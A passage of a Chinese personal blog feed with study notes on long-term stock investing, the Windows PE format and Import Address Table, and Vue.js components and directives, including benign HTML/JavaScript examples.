        <content type="html"><![CDATA[<h2 id="投资到底赚的是谁的钱"><a href="#投资到底赚的是谁的钱" class="headerlink" title="投资到底赚的是谁的钱?"></a>投资到底赚的是谁的钱?</h2><p>首先股市投资是会创造财富的。要记住我们真正投资的不是股票，而是投资股票背后的企业。企业是会创造财富的，所以投资股市，给企业相应的资本，这些资本就会产生新的财富。这实际上就是股市会长期上涨的根本原因。投资有回报，这种回报就是由于新财富的产生而创造的。</p><p>长期来看，市场是向上的，我们赚的是投资企业的钱，所以有人说投资是赚钱的，只是赚多赚少的问题，这种说法也对，但前提是长期。</p><h2 id="各种指数和股票的对应关系"><a href="#各种指数和股票的对应关系" class="headerlink" title="各种指数和股票的对应关系"></a>各种指数和股票的对应关系</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211116113210.png" alt="指数"></p><h2 id="为什么必需消费和医药更容易赚钱？"><a href="#为什么必需消费和医药更容易赚钱？" class="headerlink" title="为什么必需消费和医药更容易赚钱？"></a>为什么必需消费和医药更容易赚钱？</h2><p>我们先来想想开公司怎样才能赚到钱？</p><p>首先我们的客户得有需求，其次我们的产品要能满足他们的需求。如果客户的需求不稳定，我们就会饥一顿饱一顿。</p><p>不过，即使客户需求稳定，我们也不一定能赚到钱。生产的产品市同质化的，客户选择我们的产品和选择别人家的没啥区别，这就是一片红海，最终竞争会导致价格战，将利润空间吞噬掉。例如智能手机行业，很多智能手机生产商都是微利。</p><p>那么，客户需求稳定，我们的产品也有别人模仿不了的优点，我们就一定能赚到钱了吗？其实也不然，有的企业需要经常再投入巨资用于维护以保证稳定的生产，赚到的钱如果不再投入，企业就会经营不下去。这个时候我们赚到的钱也不属于自己。例如某些高污染的重工业，不注重风控的金融业，即使前期赚到大钱，后期也会还回去。</p><p>所以，市场需求比较稳定，企业有护城河能保证一定的利润率，并且再投资需求小，能获得大量的自由现金流，只有容易形成这些条件的行业，才能比较容易地赚钱。</p><p><strong>为什么可口可乐和茅台一度成为价值投资的标签呢？它们比较符合上面的条件：需求受经济周期的影响小，品牌护城河能保证不错的利润率，再投资需求比较小，赚到的钱大多都是自由现金流。</strong></p><p>如果在二级市场投资这样的企业，想赚钱还要增加一个条件：企业愿意回馈股东，而不是乱花钱。如果企业是赚钱的，但是管理者把赚到的钱随意乱花、铺张浪费，或者进行风险很大的投资，也会导致企业出现问题。</p><p>任何一个行业都是国家经济不可缺少的一部分，只要走了正确的路子，任何一个行业都是能赚钱的，不过赚钱的难度上有着明显差异。</p><p>所以，消费和医药行业天生就更容易赚到钱。</p><h2 id="强周期性行业"><a href="#强周期性行业" class="headerlink" title="强周期性行业"></a>强周期性行业</h2><blockquote><p>这个就是爸爸经常说的那种，在比较便宜的时候买入，在比较贵的时候卖出，就能获得不错的收益。</p></blockquote><p>这个东西吧，要能理解行业盈利的周期，最起码你得知道大概什么阶段处于周期底部，大概什么阶段处于周期顶部。这样才能实现稳定的收益。</p>]]></content>
      
      
      <categories>
          
          <category> 财经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基金 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理-2-IAT</title>
      <link href="/2021/11/13/ni-xiang-gong-cheng-he-xin-yuan-li-2-iat/"/>
      <url>/2021/11/13/ni-xiang-gong-cheng-he-xin-yuan-li-2-iat/</url>
      
        <content type="html"><![CDATA[<h1 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h1><p>从DOS头到节区头是PE头部分，其下的节区合称为PE体。文件中使用offset，内存中使用VA(Virtual Address)虚拟地址来表示位置。文件加载到内存时，情况就会发生变化(节区的大小、位置等)。文件的内容一般可分为代码<code>.text</code>、数据<code>.data</code>、资源<code>.rsrc</code>。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211113151027.png" alt="PE文件"></p><h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><p>PE头由许多结构体组成。</p><ul><li>DOS头</li><li>DOS存根</li><li>NT头<ul><li>文件头</li><li>可选头</li></ul></li><li>节区头</li></ul><p>RVA(Relative Vritual Address) to RAW(文件偏移地址是指数据在PE文件中的地址，是文件在磁盘上存放时相对于文件开头的偏移。文件偏移地址从pe文件的第一个字节开始计数，起始值为0)</p><p><code>RAW - PointerToRawData = RVA - VirtualAddress</code></p><p>PointerToRawData: 磁盘文件中节区的起始位置<br>VirtualAddress: 内存中节区的起使地址</p><h3 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h3><p>Import Address Table导入地址表，IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。</p><h4 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h4><p>16位的DOS不存在DLL，只有库Library一说，比如在C语言中使用printf()函数时，编译器会先从C库中读取相应函数的二进制代码，然后插入应用程序。也就是说，可执行文件中包含着printf函数的二进制代码。Windows OS支持多任务，若仍采用这种包含库的方式会变得非常没有效率。在同时运行多个程序的情况下，会造成严重的资源浪费(内存和磁盘空间)。因此设计出了DLL概念：</p><ul><li>不需要把库包含在程序中，单独组成DLL文件，需要时调用即可</li><li>内存映射技术使加载后的DLL代码、资源在多个进程中实现共享</li><li>更新库时只需要替换相关的DLL文件即可</li></ul><blockquote><p>如何理解DLL文件节约了磁盘和内存空间？<br>之前的多个程序无论是在源代码还是加入内存时，都包含了printf函数的二进制代码。现在大家可以共享内存中DLL文件中的printf函数，这样的话，不仅源代码中不用包含printf函数(节约了磁盘空间)，加载至内存后还可以共享一个printf函数(节约了内存空间)</p></blockquote><h4 id="IMAGE-IMPORT-DESCRIPTOR-IMPORT-Directory-Table"><a href="#IMAGE-IMPORT-DESCRIPTOR-IMPORT-Directory-Table" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR(IMPORT Directory Table)"></a>IMAGE_IMPORT_DESCRIPTOR(IMPORT Directory Table)</h4><p>记录PE文件要导入哪些库文件<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211113160018.png" alt="IMAGE_IMPORT_DESCRIPTOR"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">IAT输入顺序1. 读取IID(IMAGE_IMPORT_DESCRIPTOR)的Name成员，获取库名称字符串(kernel32.dll)2. 装载相应库 -> LoadLibrary("kernel32.dll")3. 读取OriginalFirstThunk成员获取INT地址(Import Name Table)4. 逐一读取INT中的数组的值，获取相应的IMAGE_IMPORT_BY_NAME地址(RVA)5. 使用IMAGE_IMPORT_BY_NAME的Hint或Name获取相应函数的起始地址 -> GetProcAddress("GetCurrentThreadld")6. 读取IID的FirstThunk(IAT)成员，获取IAT地址7. 将上面获取到的函数地址输入相应的IAT数组值8. 重复以上步骤4-7，直到INT结束(遇到NULL时)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>IMAGE_IMPORT_DESCRIPTOR</code>结构体数组不在PE头而在PE体中，但查找其位置的信息在PE头中，<code>IMAGE_OPTIONAL_HEADER32.DataDirectory[1].VirtualAddress</code>即是<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体数组的起始地址(RVA值)。<strong>期间注意RVA和RAW(文件偏移)之间的转换–要用到节区头中.text端的相关信息</strong></p><blockquote><p>整体上寻找信息的思路为</p><ol><li>先在 <code>IMAGE_OPTIONAL_HEADER32</code>中找到 <code>IMPORT Directory</code>的RVA值并将其转换成<code>RAW文件偏移</code>，并根据转换出来的文件偏移找到<code>IMPORT Directory</code>的位置<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211113173647.png" alt="寻找IMPORT Directory"></li><li>再根据<code>IMPORT Directory</code>相应数据(<strong>同样要转换为RAW文件偏移</strong>)找到导入函数表、导入DLL表、导入函数的实际地址表。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211113174053.png" alt="寻找其他表"></li></ol></blockquote><p><code>IMAGE_IMPORT_DESCRIPTOR</code>结构体中的命名很奇怪，OriginalFirstThunk对应的是<strong>导入函数表</strong>INT(Import Name Table ) address。FirstThunk对应的是<strong>导入函数地址表</strong>IAT(Import Address Table)address。Name对应的是 <strong>导入DLL表</strong>library name string address</p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习-3-Vue组件</title>
      <link href="/2021/11/09/vue-xue-xi-3-vue-zu-jian/"/>
      <url>/2021/11/09/vue-xue-xi-3-vue-zu-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue-js组件"><a href="#Vue-js组件" class="headerlink" title="Vue.js组件"></a>Vue.js组件</h1><h2 id="组件的基本使用"><a href="#组件的基本使用" class="headerlink" title="组件的基本使用"></a>组件的基本使用</h2><p>前端组件化开发是现在前端框架中一个非常重要的思想,对页面内容进行拆分过后，便可独立维护,可复用性大大提高了。哪里出现问题，直接去修改对应的组件即可。</p><h3 id="全局组件"><a href="#全局组件" class="headerlink" title="全局组件"></a>全局组件</h3><p>全局注册的组件可以在任何一个div中使用该组件</p><h3 id="局部组件"><a href="#局部组件" class="headerlink" title="局部组件"></a>局部组件</h3><p>在实例选项中注册组件，这个组件只能在这个实例中使用</p><h3 id="组件中的data"><a href="#组件中的data" class="headerlink" title="组件中的data"></a>组件中的data</h3><p>组件中的data不是一个对象,而是一个函数。这样的好处在于每个实例可以维护一份被返回对象的独立副本。如果data是一个对象,则会影响到其他实例，因为js对象是引用类型的,return外部对象是会被共享的。所以，需要为每个组件返回一个新的对象。</p><h3 id="使用template元素创建组件"><a href="#使用template元素创建组件" class="headerlink" title="使用template元素创建组件"></a>使用template元素创建组件</h3><p>直接将组件内的元素写在<code>&lt;template&gt;&lt;/template&gt;</code>标签内,符合编写HTML标签的习惯，使代码阅读性更强。</p><h3 id="组件嵌套"><a href="#组件嵌套" class="headerlink" title="组件嵌套"></a>组件嵌套</h3><p>组件嵌套是指把组件与组件嵌套在一起,在父组件下的模板中，以标签的形式调用子组件。</p><h3 id="使用props传递数据"><a href="#使用props传递数据" class="headerlink" title="使用props传递数据"></a>使用props传递数据</h3><ul><li>props的值是字符串数组</li><li>props的值是对象</li></ul><h2 id="组件通信"><a href="#组件通信" class="headerlink" title="组件通信"></a>组件通信</h2><p>组件实例的作用域是相互独立的，这就意味着不同组件之间无法相互引用。组件间的通信包括3种情况: 父组件向子组件通信；子组件向父组件通信；非父子组件之间的通信。</p><h3 id="父组件向子组件通信"><a href="#父组件向子组件通信" class="headerlink" title="父组件向子组件通信"></a>父组件向子组件通信</h3><p>通过props实现,在子组件标签章添加子组件props中创建的属性，把需要传递给子组件的值赋值给该属性。</p><p>如果传递的数据不是静态数据，可以使用<code>v-bind</code>指令来动态地绑定props的值。当父组件的数据变化时，这种变化会传递给子组件。</p><blockquote><p>父级props的更新会向下流动到子组件中，但是子组件的更新不会影响父级props。这样会防止子组件意外改变父组件的状态，从而导致应用的数据流向难以理解。</p></blockquote><h3 id="子组件向父组件通信"><a href="#子组件向父组件通信" class="headerlink" title="子组件向父组件通信"></a>子组件向父组件通信</h3><p>当子组件需要向父组件传递数据时，就要用到自定义事件。<code>v-on</code>指令除了监听DOM事件之外，还可以用于组件之间的自定义事件。子组件通过<code>$emit</code>来触发事件，父组件在子组件的自定义标签上使用<code>v-on</code>指令来监听子组件触发的自定义事件。</p><h3 id="非父子组件之前的通信"><a href="#非父子组件之前的通信" class="headerlink" title="非父子组件之前的通信"></a>非父子组件之前的通信</h3><p>非父子组件之前通信时，需要引入一个Vue实例bus作为媒介，通过bus触发事件和监听事件来实现组件之前的通信和参数传递，类似于子组件向父组件通信，但是利用了一个新的Vue实例作为媒介，而不是以当前Vue实例作为媒介。</p><h3 id="创建自定义组件"><a href="#创建自定义组件" class="headerlink" title="创建自定义组件"></a>创建自定义组件</h3><p>一般来说,就是有组件嵌套的。然后可以在全局和局部都注册该组件。父组件main-work中使用了子组件main-work-list, 并实现了组件间的通信。父组件将值下发给子组件，子组件使用<code>v-for</code>指令将列表显示出来，只要改变父组件的值，子组件中的列表值就会发生改变。当使用<code>$emit（）</code>触发事件实现选择子组件的列表项时，该列表项的值便可以传递给父组件</p><blockquote><p>通过我的观察发现，父组件中套用子组件，子组件在使用<code>$emit</code>向父组件传递数据的时候，一般都是触发的父组件中的函数或者是将父组件中实现的函数绑定在子组件的事件中。</p></blockquote><h2 id="内容分发"><a href="#内容分发" class="headerlink" title="内容分发"></a>内容分发</h2><p>使用<code>&lt;slot&gt;</code>标签作为承载分发内容的出口，当需要混合父组件的内容和子组件的模板时，就会用到<code>slot</code>。换句话说就是当组件的内容由父组件决定时，就会使用<code>slot</code>。</p><blockquote><p>emmmm….从效果的角度上面讲，和<strong>父组件传递数据到子组件</strong>是一样的，但是从代码的角度上面看的话，内容分发要简洁很多。</p></blockquote><h3 id="单个插槽"><a href="#单个插槽" class="headerlink" title="单个插槽"></a>单个插槽</h3><p>在子组件中使用特殊的<code>slot</code>元素就可以为这个子组件开启一个<code>slot</code>。父组件模板中，插入在子组件标签内的所有内容将代替子组件的<code>slot</code>标签和内容。</p><h3 id="具名插槽"><a href="#具名插槽" class="headerlink" title="具名插槽"></a>具名插槽</h3><p>如果一个组件中有多个部分的内容是动态的,则需要为<code>slot</code>元素指定一个name属性，具有name属性的插槽称为具名插槽。具名插槽可以分发多个内容，也可以与单个插槽共存。</p><h3 id="作用域插槽"><a href="#作用域插槽" class="headerlink" title="作用域插槽"></a>作用域插槽</h3><p>使用<code>slot</code>元素后，子组件可向父组件传递数据，从而实现与父级的通信。Vue还提供了另外一种通信方式。在父级中，具有特殊属性<code>scope</code>的<code>template</code>元素被称为作用域插槽模板。<code>scope</code>的值对应一个临时变量名,此变量用于接受从子组件中传递的props对象。</p><blockquote><p>这个例子不是很好理解，所以我把代码和效果贴上来了</p></blockquote><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>作用域插槽<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>my-component</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myProps<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">color</span><span class="token punctuation">:</span>read<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>&#123;&#123;myProps.text&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>my-component</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span><span class="token attr-name">"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span> text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'my-component'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>   <span class="token literal-property property">template</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">   &lt;div class="container">    &lt;slot text="hello from child">&lt;/slot>   &lt;/div> </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211112111517.png" alt="效果"></p><blockquote><p>在上述代码中，slot元素的text属性被赋值为hello from child，在父组件中使用了作用域插槽模板，在template中使用了scope属性对应的变量myProps接受子组件数据,并通过，将子组件的数据显示出来</p></blockquote><h4 id="作用域插槽2"><a href="#作用域插槽2" class="headerlink" title="作用域插槽2"></a>作用域插槽2</h4><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211112113724.png" alt="注释掉template之后"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211112113805.png" alt="没注释template之前"></p><p>要是把这部分的template的部分注释掉的话,网页中就显示不出来之前的内容了</p><p>因为slot本身是要父组件把内容分发给子组件的，这个temlpate的过程就相当于是</p><ul><li>先利用props将数据传递给子组件</li><li>再利用scope把子组件中的props传递给父组件</li><li>最后在template中将内容分发给子组件</li></ul><p><strong>至于这里面的循环是怎么实现的我就不是很清楚了</strong></p><h2 id="动态组件"><a href="#动态组件" class="headerlink" title="动态组件"></a>动态组件</h2><p>通过使用保留的componet元素动态地绑定到其is特性上，可以使多个组件匹配到一个挂载点，并动态进行切换。简直就是天然的Tab标签页面之间的转换。</p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue学习-2-Vue内置指令</title>
      <link href="/2021/11/08/vue-xue-xi-2-vue-nei-zhi-zhi-ling/"/>
      <url>/2021/11/08/vue-xue-xi-2-vue-nei-zhi-zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue-js内置指令"><a href="#Vue-js内置指令" class="headerlink" title="Vue.js内置指令"></a>Vue.js内置指令</h1><ul><li><strong>基本指令</strong> <code>v-text</code>,<code>v-html</code>,<code>v-cloak</code>,<code>v-once</code>,<code>v-if</code>,<code>v-else</code>,<code>v-show</code>,<code>v-on</code>,<code>v-for</code>、数组更新</li><li><strong>v-bind指令</strong> 当数据变化时，可以对属性进行重新渲染。</li><li><strong>v-model指令</strong> 本质是监听用户的输入事件，从而更新数据。它会将Vue实例中的数据作为数据来源，当输入事件发生时，它会实时更新Vue实例中的数据，从而实现数据的双向绑定。</li></ul><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><blockquote><p>实现一个简单的购物车</p></blockquote><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211109094727.png" alt="效果"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这个就是算个总和，没有什么难度。不过有一点需要注意。就是这个v-for的循环渲染的问题</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211109094823.png" alt="v-for循环渲染"></p><p>要么写成这样 <code>v-for=&quot;(item,index) in shopItems&quot;</code>要么写成<code>v-for=&quot;item in shopItems&quot;</code></p><p>写成 <code>v-for=&quot;(item) in shopItems&quot;</code>是没办法渲染的。 ❌</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/vue/2.4.2/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span>        <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>vue_det<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group list-group-horizontal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item  flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>序号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item  flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>商品名称<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item  flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>商品单价<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item  flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>购买数量<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item  flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>操作<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>(item,index) in shopItems<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group list-group-horizontal-sm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item flex-fill<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&#123;&#123;item.id&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group-item flex-fill<span class="token punctuation">"</span></span><span 